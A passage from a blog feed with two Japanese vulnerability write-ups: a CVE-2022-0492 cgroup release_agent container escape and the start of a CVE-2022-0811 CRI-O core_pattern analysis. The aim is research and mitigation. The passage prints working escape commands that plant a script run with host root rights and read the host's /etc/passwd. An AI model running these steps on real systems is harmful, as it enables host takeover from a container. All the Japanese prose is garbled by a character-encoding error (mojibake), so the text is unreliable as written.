--decode=000001ffffffffff0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,38,39,40   â† CAP_SYS_ADMIN ã‚’æŒã¤root@ab988587a245:/# mount -t cgroup -o rdma cgroup /mnt   â† rdma ã‚µãƒ–ã‚·ã‚¹ãƒ†ãƒ ã‚’ãƒã‚¦ãƒ³ãƒˆroot@ab988587a245:/# ls /mntcgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasksroot@ab988587a245:/# mount | grep 'cgroup (rw'cgroup on /mnt type cgroup (rw,relatime,rdma)ã“ã“ã¾ã§ã§ã€ã‚³ãƒ³ãƒ†ãƒŠå†…ã‹ã‚‰ release_agent ã«æ›¸ãè¾¼ã‚ã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã—ãŸã€‚ç¶šã„ã¦ã‚³ãƒ³ãƒ†ãƒŠå†…ã®ãƒ«ãƒ¼ãƒˆ (/) ã«ã€ãƒ›ã‚¹ãƒˆã®æ¨©é™ã§å®Ÿè¡Œã•ã›ãŸã„ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’é…ç½®ã—ã¾ã™ã€‚ä»Šå›ã¯ /etc/passwd ã‚’ã‚³ãƒ³ãƒ†ãƒŠå†…ã«å‡ºåŠ›ã™ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½œæˆã—ã¦ã„ã¾ã™ã€‚release_agent ã«è¨­å®šã™ã‚‹ã®ã¯ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®ãƒ‘ã‚¹ã§ã™ãŒã€ãƒ›ã‚¹ãƒˆã‹ã‚‰è¦‹ãŸçµ¶å¯¾ãƒ‘ã‚¹ã‚’æŒ‡å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚root@ab988587a245:/# host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`root@ab988587a245:/# echo $host_path/var/lib/docker/overlay2/20c4102a1a817b0e564734054b876c051732c62f4993ce682508ac7cd7fcb1c6/diff   â† upperdir ã®ãƒ‘ã‚¹root@ab988587a245:/# echo \"$host_path/cmd\" \u003e /mnt/release_agentroot@ab988587a245:/# echo '#!/bin/sh' \u003e /cmdroot@ab988587a245:/# echo \"cat /etc/passwd \u003e $host_path/output\" \u003e\u003e /cmdroot@ab988587a245:/# chmod a+x /cmdæœ€å¾Œã«ç”¨æ„ã—ãŸãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’èµ·å‹•ã™ã‚‹ãŸã‚ã€cgroup å†…ã®ãƒ—ãƒ­ã‚»ã‚¹ã‚’ç©ºã«ã—ã¾ã™ã€‚root@ab988587a245:/# mkdir /mnt/xx   â† child cgroup ã‚’ä½œæˆroot@ab988587a245:/# ls /mnt/xx/cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasksroot@ab988587a245:/# echo 1 \u003e /mnt/xx/notify_on_releaseroot@ab988587a245:/# sh -c \"echo \\$\\$\" \u003e /mnt/xx/cgroup.procs   â† ã™ãã«çµ‚äº†ã™ã‚‹ãƒ—ãƒ­ã‚»ã‚¹ã‚’ child cgroup ã«è¿½åŠ root@ab988587a245:/# cat /output   â† ã‚³ãƒ³ãƒ†ãƒŠå†…ã«ãƒ›ã‚¹ãƒˆã® /etc/passwd ãŒå‡ºåŠ›ã•ã‚Œã¦ã„ã‚‹root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologin...ä¿®æ­£ãƒ‘ãƒƒãƒhttps://github.com/torvalds/linux/commit/24f6008564183aa120d07c03d9289519c2fe02afhttps://github.com/torvalds/linux/commit/467a726b754f474936980da793b4ff2ec3e382a7  static ssize_t cgroup_release_agent_write(struct kernfs_open_file *of, char *buf, size_t nbytes, loff_t off)  {    struct cgroup *cgrp;+   struct cgroup_file_ctx *ctx;    BUILD_BUG_ON(sizeof(cgrp-\u003eroot-\u003erelease_agent_path) \u003c PATH_MAX);+   /*+    * Release agent gets called with all capabilities,+    * require capabilities to set release agent.+    */+   ctx = of-\u003epriv;+   if ((ctx-\u003ens-\u003euser_ns != \u0026init_user_ns) ||+       !file_ns_capable(of-\u003efile, \u0026init_user_ns, CAP_SYS_ADMIN))+     return -EPERM;    cgrp = cgroup_kn_lock_live(of-\u003ekn, false);ä¿®æ­£å¾Œã¯ä¸Šè¨˜æ¤œè¨¼æ‰‹é †ã§ã® release_agent ã¸ã®æ›¸ãè¾¼ã¿ã¯ã§ãã¾ã›ã‚“ã€‚ã“ã‚Œã¯æ›¸ãè¾¼ã¿ãƒ—ãƒ­ã‚»ã‚¹ãŒ CAP_SYS_ADMIN ã¯æŒã¡ã¾ã™ãŒã€init user ns ã§ãªã„ãŸã‚ã ã¨ç†è§£ã—ã¦ã„ã¾ã™ã€‚init user ns ã‹ã¤ CAP_SYS_ADMIN ã‚’åŒæ™‚ã«æº€ãŸã™ã®ã¯ã€éç‰¹æ¨©ã‚³ãƒ³ãƒ†ãƒŠã«ãŠã„ã¦ã¯ä¸å¯èƒ½ã¨ãªã‚Šã¾ã—ãŸã€‚ï¼ˆå³å¯†ã«ã¯ãƒ—ãƒ­ã‚»ã‚¹ã® capability ã¨ã€å¯¾è±¡ cgroup ã®æ‰€æœ‰ user ns ã®ãƒã‚§ãƒƒã‚¯ã‚’è¡Œãªã£ã¦ã„ã¾ã™ï¼‰# uname -r5.17.0-051700rc7-generic# docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bashroot@a45e44c77da9:/# unshare -rmC bashroot@a45e44c77da9:/# mount -t cgroup -o rdma cgroup /mntroot@a45e44c77da9:/# ls /mntcgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasksroot@a45e44c77da9:/# echo test \u003e /mnt/release_agent bash: echo: write error: Operation not permittedãŸã ã—ç‰¹æ¨©ã‚³ãƒ³ãƒ†ãƒŠã§ã¯å¼•ãç¶šãã‚³ãƒ³ãƒ†ãƒŠãƒ–ãƒ¬ã‚¤ã‚¯ã‚¢ã‚¦ãƒˆã¯å¯èƒ½ã§ã™ã€‚SELinux ã‚’è¨­å®šã™ã‚‹ç­‰ã®å¯¾ç­–ã¯å¿…è¦ã§ã™ã€‚ã‚³ãƒ³ãƒ†ãƒŠã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚³ãƒ³ãƒ†ãƒŠã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã¨æœ¬è„†å¼±æ€§ã®é–¢ä¿‚ã«ã¤ã„ã¦ç°¡å˜ã«è¦‹ã¦ã„ãã¾ã™ã€‚seccompseccomp ã¯ã‚³ãƒ³ãƒ†ãƒŠå†…ã§å®Ÿè¡Œã§ãã‚‹ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚’åˆ¶é™ã—ã¾ã™ã€‚ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚’ãƒ–ãƒ­ãƒƒã‚¯ã™ã‚‹ãŸã‚ã€ns ã‚’ä½œæˆã™ã‚‹æ®µéšã§ã‚¨ãƒ©ãƒ¼ã¨ãªã‚Šã¾ã™ã€‚# docker run --rm -it --security-opt apparmor=unconfined ubuntu bashroot@fb3522b81478:/# cat /proc/self/status | grep SeccompSeccomp:    2Seccomp_filters:    1root@fb3522b81478:/# unshare -rmC bashunshare: unshare failed: Operation not permittedAppArmor (SELinux)ãƒ•ã‚¡ã‚¤ãƒ«æ“ä½œã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ å®Ÿè¡Œã€capabilities ç­‰ã‚’åˆ¶é™ã—ã¾ã™ã€‚# docker run --rm -it --security-opt seccomp=unconfined ubuntu bashroot@46912ffebb2c:/# cat /proc/self/attr/current docker-default (enforce)root@46912ffebb2c:/# unshare -rmC bashunshare: cannot change root filesystem propagation: Permission deniedKubernetes ã®å ´åˆKubernetes ã«ãŠã„ã¦ã¯ã€seccomp ã‚„ AppArmor/SELinux ã¯ç’°å¢ƒã‚„è¨­å®šæ¬¡ç¬¬ã§ã¯ OFF ã®ãŸã‚å½±éŸ¿ãŒå‡ºã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚AppArmor/SELinux ã¯ Kubernetes ãƒãƒ¼ãƒ‰ã‚„ã‚³ãƒ³ãƒ†ãƒŠãƒ©ãƒ³ã‚¿ã‚¤ãƒ ã§æœ‰åŠ¹ã«ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã•ã‚‰ã« seccomp ã¯ Pod ã®ãƒãƒ‹ãƒ•ã‚§ã‚¹ãƒˆã«ã‚‚è¨­å®šã—ãªã‘ã‚Œã°ãªã‚Šã¾ã›ã‚“ã€‚ã¾ãŸ securityContext ã«é©åˆ‡ãªè¨­å®šã‚’ã™ã‚‹ã“ã¨ã‚‚é‡è¦ã§ã™ã€‚allowPrivilegeEscalation, readOnlyRootFilesystem, capabilities ç­‰ã§ã‚³ãƒ³ãƒ†ãƒŠã®æ©Ÿèƒ½ã‚’åˆ¶é™ã™ã‚Œã°ã€ä»Šå¾Œç”Ÿã¾ã‚Œã‚‹è„†å¼±æ€§ã®äºˆé˜²ã«ã‚‚ãªã‚‹ã¨è€ƒãˆã¾ã™ã€‚EKS, GKE ã®å ´åˆEKS ã®ãƒãƒ¼ãƒ‰ã«ä½¿ã‚ã‚Œã‚‹ Amazon Linux 2 ã§ã¯ã€rdma ã®ã‚ˆã†ãªã‚³ãƒ³ãƒ†ãƒŠå†…ã« root cgroup ãŒãƒã‚¦ãƒ³ãƒˆã•ã‚ŒãŸã‚µãƒ–ã‚·ã‚¹ãƒ†ãƒ ã¯ãªã„ã‚ˆã†ã§ã™ã€‚ã“ã®ãŸã‚ cgroup ã‚’æ–°è¦ã«ãƒã‚¦ãƒ³ãƒˆã—ã¦ã‚‚ release_agent ã¯è¦‹ãˆãšã€æœ¬è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚# docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bashroot@287fcd93a54f:/# cat /proc/self/cgroup 11:pids:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b010:devices:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b09:hugetlb:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b08:perf_event:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b07:net_cls,net_prio:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b06:blkio:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b05:memory:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b04:cpu,cpuacct:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b03:freezer:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b02:cpuset:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b01:name=systemd:/docker/287fcd93a54f465d1c8c1307fe198acc8592b0000e0571738a138bf1b1c996b0GKE ã®ãƒãƒ¼ãƒ‰ã«ä½¿ã‚ã‚Œã‚‹ COS ã§ã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ AppArmor ãŒæœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹ã‚ˆã†ã§ã™ã€‚(https://cloud.google.com/container-optimized-os/docs/how-to/secure-apparmor)$ k run ubuntu --image ubuntu -- sleep 3600pod/ubuntu created$ k exec -it ubuntu -- bashroot@ubuntu:/# cat /proc/self/attr/current cri-containerd.apparmor.d (enforce)root@ubuntu:/# unshare -rmC bashunshare: cannot change root filesystem propagation: Permission deniedä»¥ä¸Šã®ã“ã¨ã‹ã‚‰ EKS, GKE ã§ã¯æœ¬è„†å¼±æ€§ã®å½±éŸ¿ã¯ãªã•ãã†ã§ã™ã€‚ã•ã„ã”ã«æœ¬è„†å¼±æ€§ã®èª¿æŸ»ã‚’é€šã˜ã¦ã€ã‚³ãƒ³ãƒ†ãƒŠã‚’æ§‹æˆã™ã‚‹ Linux ã®è¦ç´ æŠ€è¡“ã‚„ã‚³ãƒ³ãƒ†ãƒŠã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã¸ã®ç†è§£ãŒæ·±ã¾ã‚Šã¾ã—ãŸã€‚Linux ã®æŠ€è¡“ã«ã¤ã„ã¦åŒ…æ‹¬çš„ã«å­¦ã¶ã®ã¯ï¼ˆå€‹äººçš„ã«ã¯ï¼‰é›£ã—ã„ã®ã§ã€ã“ã®ã‚ˆã†ãªè„†å¼±æ€§ã®èª¿æŸ»ã‹ã‚‰å­¦ã¶ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã‚‚è‰¯ã„ã®ã§ã¯ã¨æ€ã„ã¾ã™ã€‚æœ¬è¨˜äº‹ãŒçš†ã•ã‚“ã®å­¦ç¿’ã®ç³§ã«ãªã‚Œã°å¹¸ã„ã§ã™ã€‚å‚è€ƒãƒªãƒ³ã‚¯CVE-2022-0492https://unit42.paloaltonetworks.jp/cve-2022-0492-cgroups/https://sysdig.jp/blog/detecting-mitigating-cve-2021-0492-sysdig/https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2022/03/06/cve-2022-0492https://nvd.nist.gov/vuln/detail/CVE-2022-0492Linuxhttps://lwn.net/Articles/679786/https://www.nginx.com/blog/what-are-namespaces-cgroups-how-do-they-work/https://linuxhint.com/install-linux-kernel-ubuntu/https://man7.org/linux/man-pages/man7/cgroups.7.htmlhttps://blog.tiqwab.com/2021/11/13/docker-and-cgroups.htmlhttps://en.wikipedia.org/wiki/Seccomphttps://en.wikipedia.org/wiki/Security-Enhanced_Linuxhttps://manpages.ubuntu.com/manpages/xenial/man5/apparmor.d.5.htmlã‚³ãƒ³ãƒ†ãƒŠã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£https://container-security.dev/security/breakout-to-host.htmlhttps://speakerdeck.com/mochizuki875/container-dev-securityhttps://speakerdeck.com/mochizuki875/container-seccomp","isoDate":"2022-04-06T14:31:50.000Z","dateMiliSeconds":1649255510000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"CVE-2022-0811 èª¿æŸ»ã¾ã¨ã‚","link":"https://kyohmizu.hatenablog.com/entry/2022/03/28/182243","contentSnippet":"CRI-O ã®è„†å¼±æ€§ (CVE-2022-0811) ã«ã¤ã„ã¦èª¿ã¹ãŸå†…å®¹ã‚’ã¾ã¨ã‚ã¾ã—ãŸã€‚è„†å¼±æ€§ã®è©³ç´°ã¨ã€é–¢é€£ã™ã‚‹ CRI-O ã®å®Ÿè£…ã‚„ Linux ã®æ©Ÿèƒ½ã‚’ç´¹ä»‹ã—ã¾ã™ã€‚CVE-2022-0811 æ¦‚è¦CRI-O ã«ã¤ã„ã¦CRI-O æ¦‚è¦pinns ã«ã‚ˆã‚‹ pod ã¸ã®ã‚«ãƒ¼ãƒãƒ«ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿è¨­å®šCoredumpã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆè¦ç‚¹æ¤œè¨¼å›é¿ç­–ä¿®æ­£ãƒ‘ãƒƒãƒcommit1commit2containerd ã®å ´åˆã•ã„ã”ã«å‚è€ƒãƒªãƒ³ã‚¯CVE-2022-0811 æ¦‚è¦CVE-2022-0811 ã¯ CRI-O ã®ä»»æ„ã‚³ãƒ¼ãƒ‰å®Ÿè¡Œãƒ»ã‚³ãƒ³ãƒ†ãƒŠãƒ–ãƒ¬ã‚¤ã‚¯ã‚¢ã‚¦ãƒˆã®è„†å¼±æ€§ã§ã€å ±å‘Šã—ãŸ CrowdStrike ç¤¾ã¯ã€Œcr8escapeã€ã¨å‘¼ã‚“ã§ã„ã¾ã™ã€‚CRI-O ã® v1.19 ä»¥é™ã«å½±éŸ¿ãŒã‚ã‚Šã€ã™ã§ã«ä¿®æ­£ãƒãƒ¼ã‚¸ãƒ§ãƒ³ãŒãƒªãƒªãƒ¼ã‚¹ã•ã‚Œã¦ã„ã¾ã™ã€‚ (è©³ç´°ã¯ Security Advisory ã‚’å‚ç…§)ã‚«ãƒ¼ãƒãƒ«ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿è¨­å®šã®æ¤œè¨¼ä¸å‚™ã«ã‚ˆã‚Šã€/proc/sys/kernel/core_pattern ã¸ã®æ›¸ãè¾¼ã¿ãŒå¯èƒ½ã¨ãªã£ã¦ã„ã¾ã—ãŸã€‚ã“ã‚Œã«ã‚ˆã‚Šãƒ—ãƒ­ã‚»ã‚¹ã‚’ç•°å¸¸çµ‚äº†ã•ã›ã‚‹ã“ã¨ã§ãƒ›ã‚¹ãƒˆã® root æ¨©é™ã§ä»»æ„ã®æ“ä½œã‚’è¡Œãˆã¾ã™ã€‚CRI-O ã«ã¤ã„ã¦CRI-O æ¦‚è¦https://github.com/cri-o/cri-oCRI-O ã¯ Kubernetes ã«æœ€é©åŒ–ã•ã‚ŒãŸè»½é‡ãªé«˜ãƒ¬ãƒ™ãƒ«ã‚³ãƒ³ãƒ†ãƒŠãƒ©ãƒ³ã‚¿ã‚¤ãƒ ã§ã™ã€‚CLI ãƒ„ãƒ¼ãƒ«ã¯ crictl (https://github.com/kubernetes-sigs/cri-tools) ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚# cat container-config.json {  \"metadata\": {      \"name\": \"ubuntu\"  },  \"image\":{      \"image\": \"ubuntu\"  },  \"command\": [      \"sleep\",      \"3600\"  ],  \"log_path\":\"ubuntu.0.log\",  \"linux\": {  }}# cat pod-config.json {    \"metadata\": {        \"name\": \"ubuntu-sandbox\",        \"namespace\": \"default\",        \"attempt\": 1,        \"uid\": \"hdishd83fjaiarawuwk28bcsb\"    },    \"log_directory\": \"/tmp\",    \"linux\": {    }}# crictl runp pod-config.json   â† pod ã®èµ·å‹•b69761649f8f655416d5cba64260298a5e462a6cb108ec54d3ae89c578510edc# crictl create b69761649f8f655416d5cba64260298a5e462a6cb108ec54d3ae89c578510edc container-config.json pod-config.json   â† ã‚³ãƒ³ãƒ†ãƒŠä½œæˆ2ce8010c047dfdf9f16aa127b701fbeda32a1e46c4efcd383f9a20484e07aef7# crictl start 2ce8010c047dfdf9f16aa127b701fbeda32a1e46c4efcd383f9a20484e07aef7   â† ã‚³ãƒ³ãƒ†ãƒŠèµ·å‹•2ce8010c047dfdf9f16aa127b701fbeda32a1e46c4efcd383f9a20484e07aef7# crictl podsPOD ID              CREATED             STATE               NAME                NAMESPACE           ATTEMPT             RUNTIMEb69761649f8f6       42 seconds ago      Ready               ubuntu-sandbox      default             1                   (default)# crictl psCONTAINER           IMAGE               CREATED             STATE               NAME                ATTEMPT             POD ID2ce8010c047df       ubuntu              19 seconds ago      Running             ubuntu              0                   b69761649f8f6pinns ã«ã‚ˆã‚‹ pod ã¸ã®ã‚«ãƒ¼ãƒãƒ«ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿è¨­å®šCRI-O ã¯ pinns utility ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€pod èµ·å‹•æ™‚ã«ã‚«ãƒ¼ãƒãƒ«ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ (sysctls) ã‚’è¨­å®šã§ãã¾ã™ã€‚first commit)è¨­å®šã«ã¯ -s ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã€key=value ã®å½¢å¼ã§è¤‡æ•°ã®ã‚«ãƒ¼ãƒãƒ«ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’é€£çµã—ã¦æ¸¡ã™ã“ã¨ãŒã§ãã¾ã™ã€‚pinns -s kernel_parameter1=value1+kernel_parameter2=value2è¨­å®šå¯èƒ½ãª sysctls ã¯ä»¥ä¸‹ã®å®Ÿè£…ã§åˆ¶é™ã•ã‚Œã¦ã„ã¾ã™ã€‚https://github.com/cri-o/cri-o/blob/main/pkg/config/sysctl.govar prefixNamespaces = map[string]Namespace{  \"kernel.shm\": IpcNamespace,  \"kernel.msg\": IpcNamespace,  \"fs.mqueue.\": IpcNamespace,  \"net.\":       NetNamespace,}// Validate checks that a sysctl is whitelisted because it is known to be// namespaced by the Linux kernel. The parameters hostNet and hostIPC are used// to forbid sysctls for pod sharing the respective namespaces with the host.// This check is only used on sysctls defined by the user in the crio.conf// file.func (s *Sysctl) Validate(hostNet, hostIPC bool) error {  nsErrorFmt := \"%q not allowed with host %s enabled\"  if ns, found := namespaces[s.Key()]; found {    if ns == IpcNamespace \u0026\u0026 hostIPC {      return errors.Errorf(nsErrorFmt, s.Key(), ns)    }    return nil  }  for p, ns := range prefixNamespaces {    if strings.HasPrefix(s.Key(), p) {      if ns == IpcNamespace \u0026\u0026 hostIPC {        return errors.Errorf(nsErrorFmt, s.Key(), ns)      }      if ns == NetNamespace \u0026\u0026 hostNet {        return errors.Errorf(nsErrorFmt, s.Key(), ns)      }      return nil    }  }  return errors.Errorf(\"%s not whitelisted\", s.Key())}sysctls ã®é©ç”¨ã¯ pinns å†…ã«å®Ÿè£…ã•ã‚Œã¦ãŠã‚Šã€-s ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã®è¨­å®šå€¤ã‚’ã‚‚ã¨ã« /proc/sys/ ä»¥ä¸‹ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãè¾¼ã¿ã‚’è¡Œãªã£ã¦ã„ã¾ã™ã€‚https://github.com/cri-o/cri-o/blob/main/pinns/src/sysctl.cstatic int write_sysctl_to_file (char * sysctl_key, char* sysctl_value){  if (!sysctl_key || !sysctl_value)  {    pwarn (\"sysctl key or value not initialized\");    return -1;  }  // replace periods with / to create the sysctl path  for (char* it = sysctl_key; *it; it++)    if (*it == '.')      *it = '/';  _cleanup_close_ int dirfd = open (\"/proc/sys\", O_DIRECTORY | O_PATH | O_CLOEXEC);  if (UNLIKELY (dirfd \u003c 0))  {    pwarn (\"failed to open /proc/sys\");    return -1;  }  _cleanup_close_ int fd = openat (dirfd, sysctl_key, O_WRONLY);  if (UNLIKELY (fd \u003c 0))  {    pwarnf (\"failed to open /proc/sys/%s\", sysctl_key);    return -1;  }  int ret = TEMP_FAILURE_RETRY (write (fd, sysctl_value, strlen (sysctl_value)));  if (UNLIKELY (ret \u003c 0))  {    pwarnf (\"failed to write to /proc/sys/%s\", sysctl_key);    return -1;  }  return 0;}Coredumpãƒ—ãƒ­ã‚»ã‚¹ãŒç•°å¸¸çµ‚äº†ã—ãŸæ™‚ã«ã€ãƒ—ãƒ­ã‚»ã‚¹ãƒ¡ãƒ¢ãƒªã® dump ã‚’ core ãƒ•ã‚¡ã‚¤ãƒ«ã¨ã—ã¦å‡ºåŠ›ã—ã¾ã™ã€‚Coredump ã®è¨­å®šã¯ /proc/sys/kernel/core_pattern ã«æ›¸ã‹ã‚Œã¦ãŠã‚Šã€ãƒ•ã‚¡ã‚¤ãƒ«ã®ç›´æ¥ç·¨é›†ã‚„ sysctl ã‚³ãƒãƒ³ãƒ‰ã§è¨­å®šã‚’å¤‰æ›´ã§ãã¾ã™ã€‚# sysctl -w kernel.core_pattern=\"%e-%s.core\"kernel.core_pattern ã«ã¯ dump ã®å‡ºåŠ›å…ˆãƒ‘ã‚¹ã‚’æŒ‡å®šã—ã¾ã™ãŒã€æœ€åˆæ–‡å­—ãŒãƒ‘ã‚¤ãƒ— | ã®å ´åˆã¯æŒ‡å®šãƒ‘ã‚¹ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’å®Ÿè¡Œã—ã¾ã™ (ã“ã®å ´åˆ dump ã¯æ¨™æº–å…¥åŠ›ã¨ã—ã¦æ¸¡ã•ã‚Œã‚‹)ã€‚/proc/sys/kernel/core_pattern ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆå€¤ã¨ã—ã¦ã€ubuntu (20.04) ã§ã¯ apport ã¨ã„ã†ãƒã‚°ãƒ¬ãƒãƒ¼ãƒˆãƒ„ãƒ¼ãƒ«ãŒæŒ‡å®šã•ã‚Œã¦ã„ã¾ã™ã€‚$ cat /proc/sys/kernel/core_pattern|/usr/share/apport/apport %p %s %c %d %P %Eã¾ãŸ Coredump ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚µã‚¤ã‚ºä¸Šé™ã¯ ulimit ã§è¨­å®šã—ã¾ã™ã€‚è„†å¼±æ€§ã¯ Soft Limit ãŒ0ã§ã‚‚åˆºã•ã‚Šãã†ã§ã™ã€‚# cat /proc/self/limits Limit                     Soft Limit           Hard Limit           Units     Max cpu time              unlimited            unlimited            seconds   Max file size             unlimited            unlimited            bytes     Max data size             unlimited            unlimited            bytes     Max stack size            8388608              unlimited            bytes     Max core file size        0                    unlimited            bytes     Max resident set          unlimited            unlimited            bytes     Max processes             3819                 3819                 processes Max open files            1024                 1048576              files     Max locked memory         67108864             67108864             bytes     Max address space         unlimited            unlimited            bytes     Max file locks            unlimited            unlimited            locks     Max pending signals       3819                 3819                 signals   Max msgqueue size         819200               819200               bytes     Max nice priority         0                    0                    Max realtime priority     0                    0                    Max realtime timeout      unlimited            unlimited            usã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆè¦ç‚¹kernel.core_pattern ã¯ Namespaced ã§ã¯ãªã„ãŸã‚ã€ãƒ›ã‚¹ãƒˆã¨ã‚³ãƒ³ãƒ†ãƒŠã§åŒã˜ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å‚ç…§ã™ã‚‹ã‚³ãƒ³ãƒ†ãƒŠå†…ã‹ã‚‰ã¯å¤‰æ›´ä¸å¯pod èµ·å‹•æ™‚ã« sysctl ã« kernel.core_pattern ã‚’è¨­å®šã§ãã‚Œã°ã€ãƒ›ã‚¹ãƒˆã®å€¤ã‚‚å¤‰æ›´ã§ãã‚‹CIO-O å†…ã§ sysctl ã®ã‚­ãƒ¼ã‚’æ¤œè¨¼ã—ã¦ã„ã‚‹ãŒã€value ã« + ã‚’å«ã‚€æ–‡å­—åˆ—ã‚’æ¸¡ã™ã“ã¨ã§ãƒã‚¤ãƒ‘ã‚¹å¯èƒ½ (ä»¥ä¸‹ã‚³ãƒ¼ãƒ‰ã‚’å‚ç…§)è¨­å®šå¾Œã«ãƒ—ãƒ­ã‚»ã‚¹ã‚’ç•°å¸¸çµ‚äº†ã•ã›ã‚‹ã“ã¨ã§ã€ãƒ›ã‚¹ãƒˆã® root æ¨©é™ã§ä»»æ„ã‚³ãƒ¼ãƒ‰å®Ÿè¡Œå•é¡Œã¨ãªã£ãŸã‚³ãƒ¼ãƒ‰func getSysctlForPinns(sysctls map[string]string) string {  // this assumes there's no sysctl with a `+` in it  const pinnsSysctlDelim = \"+\"  g := new(bytes.Buffer)  for key, value := range sysctls {    fmt.Fprintf(g, \"'%s=%s'%s\", key, value, pinnsSysctlDelim)  // â† \"'key1=value1'+'key2=value2'\" ã®å½¢ã§æ–‡å­—åˆ—é€£çµã™ã‚‹  }  return strings.TrimSuffix(g.String(), pinnsSysctlDelim)}æ¤œè¨¼è„†å¼±ãªãƒãƒ¼ã‚¸ãƒ§ãƒ³ã® CRI-O ã§ CVE-2022-0811 ã‚’æ¤œè¨¼ã—ã¾ã™ã€‚Kubernetes ã¯ä½¿ç”¨ã›ãšã€crictl ã§ã®æ¤œè¨¼ã‚’è¡Œã„ã¾ã—ãŸã€‚# crio --versioncrio version 1.23.1Version:          1.23.1GitCommit:        af642cdafed31e4be5dd82e996bb084050c8bb89GitTreeState:     dirtyBuildDate:        1980-01-01T00:00:00ZGoVersion:        go1.17.4Compiler:         gcPlatform:         linux/amd64Linkmode:         staticBuildTags:        apparmor, exclude_graphdriver_devicemapper, seccomp, selinuxSeccompEnabled:   trueAppArmorEnabled:  trueæœ€åˆã«ãƒ›ã‚¹ãƒˆã«å®Ÿè¡Œã•ã›ãŸã„ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’é…ç½®ã™ã‚‹ã‚³ãƒ³ãƒ†ãƒŠã‚’ä½œæˆã—ã¾ã™ã€‚jsonã€pod-config.json 